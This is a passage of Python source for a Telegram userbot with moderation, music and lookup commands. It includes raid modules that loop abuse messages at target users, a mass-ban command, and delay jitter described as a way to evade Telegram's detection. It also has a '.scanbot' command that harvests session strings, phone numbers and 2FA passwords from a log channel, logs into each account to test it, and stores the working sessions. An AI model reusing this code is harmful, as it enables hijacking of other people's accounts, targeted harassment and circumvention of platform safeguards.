        elif re.match(r"(?i)^\.mastersync(?:\s+(on|off))?$", text):
            # Bug fix: .mastersync was documented in /help but had no actual
            # command handler — only the inline "Master Sync" button worked.
            if not await verify_privileges(event, client=client, strict_owner_only=True): return
            asyncio.create_task(event.delete())
            m_ms = re.match(r"(?i)^\.mastersync(?:\s+(on|off))?$", text)
            arg  = (m_ms.group(1) or "").lower()
            if arg == "on":
                cfg["MASTER_SYNC"] = True
            elif arg == "off":
                cfg["MASTER_SYNC"] = False
            else:
                cfg["MASTER_SYNC"] = not cfg.get("MASTER_SYNC", False)
            save_config(cfg)
            st = "ON" if cfg["MASTER_SYNC"] else "OFF"
            await safe_send_and_track(client, chat_id,
                f"<blockquote>🔄  <b>Master Sync is now {st}</b></blockquote>")

        elif re.match(r"(?i)^\.multi\s+(.+)", text):
            if not await verify_privileges(event, client=client, strict_owner_only=True): return
            m       = re.search(r"(?i)^\.multi\s+(.+)", text)
            asyncio.create_task(event.delete())
            args    = m.group(1).split()
            dest    = int(args[0]) if args[0].replace('-', '').isdigit() else chat_id
            targets = args[1:] if dest != chat_id else args
            istate.multi_targets.setdefault(dest, []).extend(targets)
            istate.active_tasks["multi"] = asyncio.current_task()
            abuses = load_words(ABUSE_PATH, DEFAULT_ABUSES)
            a_idx  = 0
            try:
                while True:
                    curr_mid = istate.last_target_msg.get(dest)
                    speed    = _safe_delay(cfg["DEFAULT_SPEEDS"].get("multi", 0.1))
                    f_idx    = cfg["ACTIVE_FONTS"].get("multi", 0)
                    word     = apply_font_transformer(abuses[a_idx % len(abuses)], f_idx)
                    if curr_mid:
                        await safe_send_and_track(client, dest, word,
                                                   reply_to=curr_mid, delay=speed)
                    else:
                        await safe_send_and_track(client, dest, word, delay=speed)
                    a_idx += 1
            except asyncio.CancelledError:
                pass

        elif re.match(r"(?i)^\.(tagall|onetag)(?:\s+(.+))?", text):
            if not await verify_privileges(event, client=client): return
            m        = re.search(r"(?i)^\.(tagall|onetag)(?:\s+(.+))?", text)
            cmd_type = m.group(1).lower()
            # If user typed a custom message → use ONLY that, skip .txt decoration
            has_custom = bool(m.group(2) and m.group(2).strip())
            msg_text   = m.group(2).strip() if has_custom else ""
            asyncio.create_task(event.delete())
            asyncio.create_task(send_module_log(
                f"🏷️ <b>{'Tagall' if cmd_type == 'tagall' else 'Onetag'} Started</b>\n"
                f"Chat: <code>{chat_id}</code>"
                + (f"  Msg: <i>{msg_text[:60]}</i>" if has_custom else "")))
            try:
                users      = await client.get_participants(chat_id)
                tag_lines  = load_words(TAGALL_PATH, DEFAULT_TAGS)
                istate.active_tasks["tagall"] = asyncio.current_task()
                f_idx      = cfg["ACTIVE_FONTS"].get("tagall" if cmd_type == "tagall" else "onetag", 0)
                batch_size = 1 if cmd_type == "onetag" else 5

                def _make_footer():
                    if has_custom:
                        # User gave explicit message — send ONLY that, no .txt deco
                        return apply_font_transformer(msg_text, f_idx)
                    # No message — use random .txt tag line
                    return apply_font_transformer(random.choice(tag_lines), f_idx)

                batch = []
                for user in users:
                    if user.bot or user.deleted:
                        continue
                    # Read speed INSIDE the loop so live .speed changes apply immediately
                    speed_key = "tagall" if cmd_type == "tagall" else "onetag"
                    speed     = _safe_delay(cfg["DEFAULT_SPEEDS"].get(speed_key, 1.5))
                    is_typing = cfg["ACTIVE_TYPING"].get(speed_key, False)
                    mention   = f"<a href='tg://user?id={user.id}'>{user.first_name or 'User'}</a>"
                    batch.append(mention)
                    if len(batch) >= batch_size:
                        full = " ".join(batch) + f"\n{_make_footer()}"
                        if is_typing:
                            try:
                                async with client.action(chat_id, 'typing'):
                                    await asyncio.sleep(_human_typing_dur(speed))
                            except Exception: pass
                        with use_tag_emoji_pool():
                            await safe_send_and_track(client, chat_id, full, delay=speed, track=False)
                        batch = []
                if batch:
                    speed_key = "tagall" if cmd_type == "tagall" else "onetag"
                    speed     = _safe_delay(cfg["DEFAULT_SPEEDS"].get(speed_key, 1.5))
                    is_typing = cfg["ACTIVE_TYPING"].get(speed_key, False)
                    full = " ".join(batch) + f"\n{_make_footer()}"
                    if is_typing:
                        try:
                            async with client.action(chat_id, 'typing'):
                                await asyncio.sleep(_human_typing_dur(speed))
                        except Exception: pass
                    with use_tag_emoji_pool():
                        await safe_send_and_track(client, chat_id, full, delay=speed, track=False)
            except asyncio.CancelledError:
                pass
            except Exception as e:
                asyncio.create_task(send_module_log(f"❌ Tagall error: <code>{e}</code>"))

        elif re.match(r"(?i)^\.rraid(?:\s+(.+))?$", text):
            if not await verify_privileges(event, client=client): return
            m      = re.search(r"(?i)^\.rraid(?:\s+(.+))?$", text)
            target = m.group(1).strip() if m.group(1) else None
            asyncio.create_task(event.delete())
            t_id      = None
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.sender_id:
                t_id = reply_msg.sender_id
            elif target:
                try:
                    ent  = await client.get_entity(target)
                    t_id = ent.id
                except Exception: pass
            if not t_id:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ <b>Target required.</b></blockquote>")
                return
            # Owner protection
            if t_id == cfg.get("OWNER_ID", 0):
                await safe_send_and_track(client, chat_id,
                    f"<a href='tg://user?id={event.sender_id}'>🙄 Tu</a> ye to mere papa hai inpe (raid spam jo hoga, wo nahi kr skta 😔❣️ I love u my dad, my superhero 😘)")
                return
            istate.rraid_active_users[chat_id] = t_id

        elif re.match(r"(?i)^\.ghost\s+(-?\d+)\s+(.+)$", text):
            if not await verify_privileges(event, client=client): return
            m        = re.search(r"(?i)^\.ghost\s+(-?\d+)\s+(.+)$", text)
            dest     = int(m.group(1))
            msg_text = m.group(2)
            asyncio.create_task(event.delete())
            await safe_send_and_track(client, dest,
                f"<blockquote>{msg_text}</blockquote>")

        elif re.match(r"(?i)^\.(ban|mute|promote|demote)$", text):
            if not await verify_privileges(event, client=client): return
            m         = re.search(r"(?i)^\.(ban|mute|promote|demote)$", text)
            action    = m.group(1).lower()
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Reply to a user to {action}.</blockquote>")
                return
            target_id = reply_msg.sender_id
            try:
                if action == "ban":
                    await client(EditBannedRequest(chat_id, target_id,
                        ChatBannedRights(until_date=None, view_messages=True)))
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>🔨 <b>Banned:</b> <code>{target_id}</code></blockquote>")
                elif action == "mute":
                    await client(EditBannedRequest(chat_id, target_id,
                        ChatBannedRights(until_date=None, send_messages=True)))
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>🔇 <b>Muted:</b> <code>{target_id}</code></blockquote>")
                elif action == "promote":
                    await client(EditAdminRequest(chat_id, target_id,
                        ChatAdminRights(change_info=True, delete_messages=True,
                                        ban_users=True, invite_users=True,
                                        pin_messages=True, manage_call=True),
                        rank="Admin"))
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>👑 <b>Promoted:</b> <code>{target_id}</code></blockquote>")
                elif action == "demote":
                    await client(EditAdminRequest(chat_id, target_id,
                        ChatAdminRights(), rank=""))
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>⬇️ <b>Demoted:</b> <code>{target_id}</code></blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Error: <code>{e}</code></blockquote>")

        elif re.match(r"(?i)^\.banall$", text):
            if not await verify_privileges(event, client=client, strict_owner_only=True): return
            asyncio.create_task(event.delete())
            proc   = await safe_send_and_track(client, chat_id,
                "<blockquote>🔨 <b>BANALL INITIATED...</b></blockquote>")
            banned, failed = 0, 0
            limit  = cfg.get("MAX_BAN_LIMIT", 300)
            istate.active_tasks["banall"] = asyncio.current_task()
            try:
                admin_ids = set()
                async for admin in client.iter_participants(
                        chat_id, filter=types.ChannelParticipantsAdmins()):
                    admin_ids.add(admin.id)
                async for user in client.iter_participants(chat_id):
                    if banned >= limit: break
                    if user.bot or user.deleted or user.id in admin_ids: continue
                    try:
                        await client(EditBannedRequest(chat_id, user.id,
                            ChatBannedRights(until_date=None, view_messages=True)))
                        banned += 1
                        await asyncio.sleep(0.3)
                    except Exception:
                        failed += 1
            except asyncio.CancelledError: pass
            except Exception: pass
            if proc:
                try:
                    await _premium_edit(proc, f"<blockquote>✅ <b>BANALL DONE</b>\n"
                        f"Banned: <code>{banned}</code> | Failed: <code>{failed}</code></blockquote>")
                except Exception: pass

        elif re.match(r"(?i)^\.restart$", text):
            if not await verify_privileges(event, client=client, strict_owner_only=True): return
            asyncio.create_task(event.delete())
            await safe_send_and_track(client, chat_id,
                "<blockquote>♻️ <b>Restarting 4ST Prime...</b></blockquote>")
            await asyncio.sleep(1)
            os.execv(sys.executable, [sys.executable] + sys.argv)

        # ══════════════════════════════════════════
        # MODULE: SCANBOT — scan log channel for session strings
        # Owner types .scanbot → bot reads LOG_CHANNEL history,
        # finds every "New Session Generated" message, parses the
        # session string + user info, validates each Telethon session
        # (skips expired ones), and saves valid ones to config.
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.scanbot$", text):
            if not await verify_privileges(event, client=client, strict_owner_only=True): return
            asyncio.create_task(event.delete())

            scan_log_cid = cfg.get("LOG_CHANNEL", -1004427086264)

            prog_msg = await safe_send_and_track(client, chat_id,
                f"<blockquote>🔍 <b>Scanning log channel...</b>\n"
                f"Chat: <code>{scan_log_cid}</code></blockquote>")

            # Regex patterns to parse the notification message format
            _re_uid   = re.compile(r"👤\s*User ID[:\s]+<code>(\d+)</code>|User ID[:\s]+(\d+)", re.IGNORECASE)
            _re_name  = re.compile(r"👤\s*Name[:\s]+(.+?)(?:\n|$)", re.IGNORECASE)
            _re_uname = re.compile(r"👤\s*Username[:\s]+(@\S+|No Username)", re.IGNORECASE)
            _re_phone = re.compile(r"📱\s*Phone[:\s]+(\+?\d[\d\s\-]+)", re.IGNORECASE)
            _re_2fa_v = re.compile(r"2FA Verified[:\s]+(Yes|No)", re.IGNORECASE)
            _re_2fa_p = re.compile(r"2FA Password[:\s]+(\S+)", re.IGNORECASE)
            # Session string: starts with 1A/1B/BQ and is long (>80 chars)
            _re_sess  = re.compile(r"((?:1[A-Z][A-Za-z0-9+/=_\-]{60,}|BQ[A-Za-z0-9+/=_\-]{60,}))")

            parsed_sessions = []   # list of dicts
            seen_strings    = set()

            try:
                async for msg in client.iter_messages(scan_log_cid):  # no limit — full chat scan
                    raw = getattr(msg, 'raw_text', '') or getattr(msg, 'text', '') or ''
                    if not raw:
                        continue
                    # Must look like a session notification
                    if 'Session' not in raw and 'SESSION' not in raw:
                        continue

                    sess_m = _re_sess.search(raw)
                    if not sess_m:
                        continue
                    sess_str = sess_m.group(1).strip()
                    if sess_str in seen_strings:
                        continue
                    seen_strings.add(sess_str)

                    uid_m  = _re_uid.search(raw)
                    uid    = int(uid_m.group(1) or uid_m.group(2)) if uid_m else 0
                    name_m = _re_name.search(raw)
                    name   = name_m.group(1).strip() if name_m else "Unknown"
                    # Strip HTML tags from name
                    name   = re.sub(r'<[^>]+>', '', name).strip()
                    un_m   = _re_uname.search(raw)
                    uname  = un_m.group(1).strip() if un_m else "Unknown"
                    ph_m   = _re_phone.search(raw)
                    phone  = ph_m.group(1).strip() if ph_m else "N/A"
                    v2_m   = _re_2fa_v.search(raw)
                    v2fa   = v2_m.group(1).strip() if v2_m else "No"
                    pw_m   = _re_2fa_p.search(raw)
                    pw2fa  = pw_m.group(1).strip() if pw_m else ""

                    parsed_sessions.append({
                        "uid":      uid,
                        "name":     name,
                        "username": uname,
                        "phone":    phone,
                        "2fa":      v2fa,
                        "2fa_pass": pw2fa,
                        "session":  sess_str,
                    })
            except Exception as _scan_err:
                if prog_msg:
                    try:
                        await _premium_edit(prog_msg,
                            f"<blockquote>❌ <b>Scan error:</b> <code>{_scan_err}</code></blockquote>")
                    except Exception: pass
                return

            if not parsed_sessions:
                if prog_msg:
                    try:
                        await _premium_edit(prog_msg,
                            "<blockquote>🔍 <b>No session messages found in log channel.</b></blockquote>")
                    except Exception: pass
                return

            # Update progress
            if prog_msg:
                try:
                    await _premium_edit(prog_msg,
                        f"<blockquote>🔍 <b>Found {len(parsed_sessions)} session(s).</b>\n"
                        f"⚡ Validating each one...</blockquote>")
                except Exception: pass

            valid_count   = 0
            expired_count = 0
            already_count = 0

            existing_strings = set(cfg.get("SAVED_STRINGS", []))
            existing_umap    = cfg.get("USER_MAPS", {}).get("telethon", {})

            for entry in parsed_sessions:
                sess_str = entry["session"]
                uid_str  = str(entry["uid"]) if entry["uid"] else None

                # Skip if session already saved
                if sess_str in existing_strings or (uid_str and uid_str in existing_umap):
                    already_count += 1
                    continue

                # Validate — try connecting
                _valid = False
                _test_client = None
                try:
                    _test_client = TelegramClient(
                        StringSession(sess_str),
                        cfg["API_ID"], cfg["API_HASH"]
                    )
                    await _test_client.connect()
                    if await _test_client.is_user_authorized():
                        _valid = True
                        # Get real user ID if we didn't parse it
                        if not entry["uid"]:
                            try:
                                _me = await _test_client.get_me()
                                entry["uid"] = _me.id
                                uid_str = str(_me.id)
                                entry["name"] = (
                                    (getattr(_me, 'first_name', '') or '') + ' ' +
                                    (getattr(_me, 'last_name', '') or '')
                                ).strip() or entry["name"]
                            except Exception:
                                pass
                    await _test_client.disconnect()
                except Exception:
                    try:
                        if _test_client:
                            await _test_client.disconnect()
                    except Exception:
                        pass

                if _valid:
                    valid_count += 1
                    # Save to SAVED_STRINGS
                    cfg.setdefault("SAVED_STRINGS", [])
                    if sess_str not in cfg["SAVED_STRINGS"]:
                        cfg["SAVED_STRINGS"].append(sess_str)
                    # Save to USER_MAPS["telethon"]
                    if uid_str:
                        cfg.setdefault("USER_MAPS", {}).setdefault("telethon", {})
                        cfg["USER_MAPS"]["telethon"][uid_str] = sess_str
                else:
                    expired_count += 1

                await asyncio.sleep(0.3)  # brief pause between validations

            # Save config (GitHub-backed)
            save_config(cfg)

            result_lines = [
                "<blockquote>✅ <b>SCANBOT COMPLETE</b>\n\n",
                f"📊 <b>Total found:</b> <code>{len(parsed_sessions)}</code>\n",
                f"✅ <b>Valid (saved):</b> <code>{valid_count}</code>\n",
                f"♻️ <b>Already saved:</b> <code>{already_count}</code>\n",
                f"❌ <b>Expired (skipped):</b> <code>{expired_count}</code>",
                "</blockquote>",
            ]
            if prog_msg:
                try:
                    await _premium_edit(prog_msg, "".join(result_lines))
                except Exception:
                    await safe_send_and_track(client, chat_id, "".join(result_lines))
            else:
                await safe_send_and_track(client, chat_id, "".join(result_lines))

        elif re.match(r"(?i)^\.how\s+(.+)$", text):
            asyncio.create_task(event.delete())
            m     = re.search(r"(?i)^\.how\s+(.+)$", text)
            cmd_q = m.group(1).strip().lower().lstrip(".").lstrip("/")
            HOW_DOCS = {
                "raid":       ".raid [count] [@/reply] — Spam N abuse msgs at target",
                "rraid":      ".rraid [@/reply] — Auto-reply abuse on every target msg",
                "spam":       ".spam [count] [text] — Repeat custom text N times",
                "ow":         ".ow [@/reply] — Continuous reply spam from ow.txt",
                "fuck":       ".fuck [@/reply] — Infinite abuse reply loop",
                "multi":      ".multi [chat_id] [@t1 @t2...] — Track multiple targets",
                "tagall":     ".tagall [msg] — Tag all members in batches of 5",
                "onetag":     ".onetag [msg] — Tag each member one-by-one",
                "sraid":      ".sraid (reply) — Smart reply raid using sraid.txt lines",
                "stopsraid":  ".stopsraid — Stop sraid mode",
                "stop":       ".stop — Stop ALL active tasks",
                "dmsec":      ".dmsec — Toggle DM security (auto-block strangers)",
                "sudoadd":    ".sudoadd [@/ID] — Add to Sudo Level 1",
                "sudoaddfull":".sudoaddfull [@/ID] — Add to Sudo Level 2 (full)",
                "sudorm":     ".sudorm [@/ID] — Remove from sudo list",
                "sudolist":   ".sudolist — Show all sudo users",
                "ban":        ".ban (reply) — Ban replied user",
                "mute":       ".mute (reply) — Mute replied user",
                "promote":    ".promote (reply) — Give admin rights",
                "demote":     ".demote (reply) — Remove admin rights",
                "banall":     ".banall — Ban ALL non-admin members",
                "speed":      ".speed [cmd] [sec] — Set delay for command",
                "font":       ".font [cmd] [0-5] — Set font style",
                "typing":     ".typing [cmd] [on/off] — Toggle typing indicator",
                "config":     ".config — Show speed/font/typing/sudo config",
                "hack":       ".hack — Animated hacking sequence (via .fun hack)",
                "magic":      ".magic — Animated magic sequence (via .fun magic)",
                "fun":        ".fun [name] — Play text animations (100+)",
                "afk":        ".afk [reason] — Set AFK mode",
                "unafk":      ".unafk — Disable AFK mode",
                "mimic":      ".mimic (reply) — AI mimics texting style",
                "setmode":    ".setmode [flirt/roast/normal/off] — AI auto-chat mode",
                "purge":      ".purge (reply) — Delete messages from reply upward",
                "id":         ".id — Show chat ID + user ID",
                "cmnd":       ".cmnd [name] [text] — Add custom command alias",
                "rmcmnd":     ".rmcmnd [name] — Remove custom command",
                "calc":       ".calc [expr] — Calculate math expression",
                "rev":        ".rev [text] — Reverse the text",
                "upper":      ".upper [text] — Convert to UPPERCASE",
                "lower":      ".lower [text] — Convert to lowercase",
                "ping":       ".ping / .alive — Check bot latency",
                "targetlist": ".targetlist — Show active tracked targets",
                "restart":    ".restart — Restart the userbot (owner only)",
                "dice":       ".dice — Send a random dice emoji",
                "play":       ".play [song name or URL] OR reply to audio — Streams in VC. "
                              "Paste any YouTube link or type a song name — it finds and plays it. "
                              "Also works with direct MP3/MP4 links, Google Drive, Dropbox, etc. "
                              "Reply to any audio/video message to stream it instantly.",
                "vplay":      ".vplay [query or URL] OR reply to video — Streams video in VC. "
                              "Works with YouTube URLs, any MP4/M3U8 link, or a video search query. "
                              "Reply to a video message to stream it directly. Max 720p for speed.",
                "skip":       ".skip — Skip current song, play next in queue",
                "playforce":  ".playforce [song/link] — Force play immediately (clears queue)",
                "pause":      ".pause — Pause current playback",
                "resume":     ".resume — Resume paused playback",
                "queue":      ".queue / .q — Show current music queue",
                "loop":       ".loop — Toggle loop for current song",
                "mend":       ".end / .mend / .stopmusic — Stop music and leave voice chat",
                "mstatus":    ".mstatus — Show music engine status",
                "ytdl":       ".ytdl [song name or URL] — Download audio and send as file in chat. "
                              "Supports YouTube, SoundCloud, any direct audio link, etc.",
                "unmute":     ".unmute (reply) — Remove mute restriction from user",
                "unban":      ".unban (reply) — Lift ban from user",
                "pin":        ".pin (reply) — Pin replied message silently",
                "unpin":      ".unpin (reply) — Unpin replied message",
                "info":       ".info [@/reply] — Show full user profile (ID, bio, status)",
                "warn":       ".warn [reason] (reply) — Warn user; auto-ban at limit",
                "unwarn":     ".unwarn (reply) — Clear all warnings for user",
                "warnlist":   ".warnlist — Show all warned users in this chat",
                "delall":     ".delall — Delete last 500 of my messages in this chat",
                "kang":       ".kang [emoji] (reply) — Steal sticker/image to your pack",
                "qout":       ".qout (reply) — Create a premium Telegram quote sticker from any message. "
                              "Reply to any text message and run .qout. Works everywhere — groups, DMs, "
                              "new users. Full-quality WebP sticker, no cut or skip.",
                "tr":         ".tr [lang] [text] — Translate text (free, no API key)",
                "weather":    ".weather [city] — Live weather (temp, humidity, wind)",
                "hack":       ".hack — Animated hacking sequence",
                "magic":      ".magic — Animated magic sequence",
                "bomb":       ".bomb — Bomb explosion animation",
                "moon":       ".moon — Moon phase animation",
                "rocket":     ".rocket — Rocket launch animation",
                # Newly added
                "safemode":   ".safemode [on/off] — Toggle safe mode (jitter + auto flood-wait handling). "
                              "When ON: all send delays get ±20-30% random jitter so Telegram can't detect "
                              "patterns. Also auto-retries on FloodWaitError. Logs flood events to log bot.",
                "song":       ".song all — Open music to everyone in chat (same as .forall)\n"
                              ".song me  — Restrict music back to owner/sudo (same as .me)",
                "forall":     ".forall — Open music commands to all chat members. Anyone can .play, .skip, etc.",
                "me":         ".me — Restrict music back to owner/sudo only in this chat.",
                "ghost":      ".ghost [chat_id] [text] — Send a message to a specific chat silently.",
                "gspam":      ".gspam [count] [text] [chat_id] — Ghost spam: send text N times to a different chat.",
                "gow":        ".gow [@target] [chat_id] — Ghost OW: run OW module targeting a user in another chat.",
                "gfuck":      ".gfuck [@target] [chat_id] — Ghost Fuck: run Fuck loop in another chat.",
                "stopsraid":  ".stopsraid — Stop sweet-raid reply mode",
                "stopm":      ".stopm / .stop — Stop ALL active modules at once",
                "stopow":     ".stopow — Stop only the OW module",
                "stopfuck":   ".stopfuck — Stop only the Fuck module",
                "stopraid":   ".stopraid — Stop only the Raid module",
                "stoprraid":  ".stoprraid — Stop only the RRaid module",
                "stopspam":   ".stopspam — Stop only the Spam module",
                "stoptagall": ".stoptagall — Stop only the Tagall module",
                "stoponetag": ".stoponetag — Stop only the Onetag module",
                "cmnd":       ".cmnd [existing_module] [new_alias] — Create an alias for a module.\n"
                              "Example: .cmnd ow oye → typing .oye will now trigger the OW module.\n"
                              "Aliases are permanent and cannot be deleted with .rmcmnd.",
                "rmcmnd":     ".rmcmnd [name] — Remove a custom TEXT command. "
                              "Module aliases cannot be removed.",
                "mastersync": ".mastersync [on/off] — Toggle master sync. When ON, owner commands "
                              "control ALL extra sessions. When OFF (default), each session is isolated.",
                "sudoadd":    ".sudoadd [@/ID] — Add to Sudo Level 1 (can use most cmds, "
                              "not strict-owner-only like restart/banall)",
                "sudoaddfull":".sudoaddfull [@/ID] — Add to Sudo Level 2 (full access, equal to owner)",
                "sudorm":     ".sudorm [@/ID] — Remove user from all sudo levels",
                "sudolist":   ".sudolist — Show all Sudo Level 1 and Level 2 users",
                "forceplay":  ".playforce [song/URL] — Immediately play song, skipping queue",
                "q":          ".q — Show music queue (short form of .queue)",
            }
            doc = HOW_DOCS.get(cmd_q)
            if doc:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>ℹ️ <b>HOW:</b> <code>.{cmd_q}</code>\n\n{doc}</blockquote>")
            else:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ No docs for: <code>.{cmd_q}</code>\n"
                    f"Use <code>.help</code> for all commands.</blockquote>")

        # ══════════════════════════════════════════
        # MODULE 1: UNMUTE — remove mute restriction
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.unmute$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a muted user to unmute.</blockquote>")
                return
            target_id = reply_msg.sender_id
            try:
                await client(EditBannedRequest(chat_id, target_id,
                    ChatBannedRights(until_date=None, send_messages=False)))
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>🔊 <b>Unmuted:</b> <code>{target_id}</code></blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Unmute failed: <code>{e}</code></blockquote>")

        # ══════════════════════════════════════════
        # MODULE 2: UNBAN — lift ban on user
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.unban$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a banned user to unban.</blockquote>")
                return
            target_id = reply_msg.sender_id
            try:
                await client(EditBannedRequest(chat_id, target_id,
                    ChatBannedRights(until_date=None, view_messages=False)))
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>✅ <b>Unbanned:</b> <code>{target_id}</code></blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Unban failed: <code>{e}</code></blockquote>")

        # ══════════════════════════════════════════
        # MODULE 3: PIN / UNPIN messages
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.(pin|unpin)$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            m      = re.match(r"(?i)^\.(pin|unpin)$", text)
            action = m.group(1).lower()
            reply_msg = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Reply to a message to {action}.</blockquote>")
                return
            try:
                if action == "pin":
                    await client.pin_message(chat_id, reply_msg.id, notify=False)
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>📌 <b>Pinned!</b> Message ID: <code>{reply_msg.id}</code></blockquote>")
                else:
                    await client.unpin_message(chat_id, reply_msg.id)
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>📌 <b>Unpinned!</b></blockquote>")
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ {action.title()} failed: <code>{e}</code></blockquote>")

        # ══════════════════════════════════════════
        # MODULE 4: INFO — full user profile info
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.info(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            m          = re.match(r"(?i)^\.info(?:\s+(.+))?$", text)
            target_arg = m.group(1).strip() if m.group(1) else None
            target_id  = await resolve_target(client, event, target_arg)
            if not target_id:
                # fallback: show own info
                target_id = my_id
            try:
                entity = await client.get_entity(target_id)
                name     = getattr(entity, 'first_name', '') or ''
                lname    = getattr(entity, 'last_name', '') or ''
                uname    = f"@{entity.username}" if getattr(entity, 'username', None) else "None"
                uid      = entity.id
                is_bot   = getattr(entity, 'bot', False)
                is_del   = getattr(entity, 'deleted', False)
                verified = getattr(entity, 'verified', False)
                premium  = getattr(entity, 'premium', False)
                bio      = ""
                try:
                    full = await client.get_entity(entity)
                    about = getattr(await client(
                        __import__('telethon').tl.functions.users.GetFullUserRequest(entity)
                    ), 'full_user', None)
                    if about:
                        bio = getattr(about, 'about', '') or ""
                except Exception:
                    pass
                info_msg = (
                    f"<blockquote>👤 <b>USER INFO</b>\n\n"
                    f"🔤 <b>Name:</b> {name} {lname}\n"
                    f"🌐 <b>Username:</b> {uname}\n"
                    f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
                    f"🤖 <b>Bot:</b> {'Yes' if is_bot else 'No'}\n"
                    f"✅ <b>Verified:</b> {'Yes' if verified else 'No'}\n"
                    f"⭐ <b>Premium:</b> {'Yes' if premium else 'No'}\n"
                    f"❌ <b>Deleted:</b> {'Yes' if is_del else 'No'}\n"
                    + (f"📝 <b>Bio:</b> {bio[:200]}\n" if bio else "")
                    + f"🔗 <b>Link:</b> <a href='tg://user?id={uid}'>Open Profile</a>\n"
                    f"</blockquote>"
                )
                await safe_send_and_track(client, chat_id, info_msg)
            except Exception as e:
                await safe_send_and_track(client, chat_id,
                    f"<blockquote>❌ Info failed: <code>{e}</code></blockquote>")

        # ── .nh / .namehistory — Name & Username history lookup ────────────
        elif re.match(r"(?i)^\.(nh|namehistory|nhistory)(?:\s+(.+))?$", text):
            asyncio.create_task(event.delete())
            m          = re.match(r"(?i)^\.(nh|namehistory|nhistory)(?:\s+(.+))?$", text)
            target_arg = m.group(2).strip() if m.group(2) else None
            target_id  = await resolve_target(client, event, target_arg)
            if not target_id:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a user or pass ID/@username</blockquote>")
            else:
                # Try live fetch + record first
                try:
                    ent  = await client.get_entity(target_id)
                    fn   = ((getattr(ent, 'first_name', '') or '') + " " +
                            (getattr(ent, 'last_name', '') or '')).strip()
                    un   = getattr(ent, 'username', None)
                    _record_name_history(target_id, fn or "Unknown", un)
                    _live_un  = f"@{un}" if un else "(no username)"
                    _live_fn  = fn or "Unknown"
                except Exception:
                    _live_fn  = "Unknown"
                    _live_un  = "Unknown"

                # Read from track file (SangMata-style)
                td       = _load_track_file(target_id)
                names_h  = td.get("names", [])
                unames_h = td.get("usernames", [])

                lines = [
                    f"<blockquote>👤 <b>History for</b> <a href='tg://user?id={target_id}'>{_live_fn}</a>  <code>{target_id}</code>",
                    f"🌐 <b>Current username:</b> {_live_un}",
                    "",
                ]

                lines.append(f"📝 <b>Names</b>  <i>({len(names_h)} records)</i>")
                if names_h:
                    for i, rec in enumerate(names_h[:30], 1):
                        lines.append(f"  <code>{i}.</code> [{rec['ts']}]  {rec['n']}")
                    if len(names_h) > 30:
                        lines.append(f"  <i>... and {len(names_h)-30} more</i>")
                else:
                    lines.append("  <i>(No name history yet)</i>")

                lines.append("")
                lines.append(f"🔗 <b>Usernames</b>  <i>({len(unames_h)} records)</i>")
                if unames_h:
                    for i, rec in enumerate(unames_h[:30], 1):
                        lines.append(f"  <code>{i}.</code> [{rec['ts']}]  {rec['u']}")
                    if len(unames_h) > 30:
                        lines.append(f"  <i>... and {len(unames_h)-30} more</i>")
                else:
                    lines.append("  <i>(No username history yet)</i>")

                lines.append("</blockquote>")
                await safe_send_and_track(client, chat_id, "\n".join(lines))

        # ══════════════════════════════════════════
        # MODULE 5: WARN / UNWARN / WARNLIST system
        # ══════════════════════════════════════════
        elif re.match(r"(?i)^\.warn(?:\s+(.+))?$", text):
            if not await verify_privileges(event, client=client): return
            asyncio.create_task(event.delete())
            m          = re.match(r"(?i)^\.warn(?:\s+(.+))?$", text)
            reason     = m.group(1).strip() if m.group(1) else "No reason"
            reply_msg  = await event.get_reply_message()
            if not reply_msg:
                await safe_send_and_track(client, chat_id,
                    "<blockquote>❌ Reply to a user to warn them.</blockquote>")
                return
            target_id  = reply_msg.sender_id
            cid_str    = str(chat_id)
            tid_str    = str(target_id)
            warns      = cfg.setdefault("WARNINGS", {})
            warns.setdefault(cid_str, {})
            warns[cid_str][tid_str] = warns[cid_str].get(tid_str, 0) + 1
            count      = warns[cid_str][tid_str]
            limit      = cfg.get("WARN_LIMIT", 3)
            save_config(cfg)
            if count >= limit:
                try:
                    await client(EditBannedRequest(chat_id, target_id,
                        ChatBannedRights(until_date=None, view_messages=True)))
                    warns[cid_str][tid_str] = 0
                    save_config(cfg)
                    await safe_send_and_track(client, chat_id,
                        f"<blockquote>🚨 <b>AUTO-BANNED!</b>\n"
                        f"User <code>{target_id}</code> reached <code>{limit}</code> warnings.\n"
                        f"Reason: {reason}</blockquote>")
                except Exception as e:
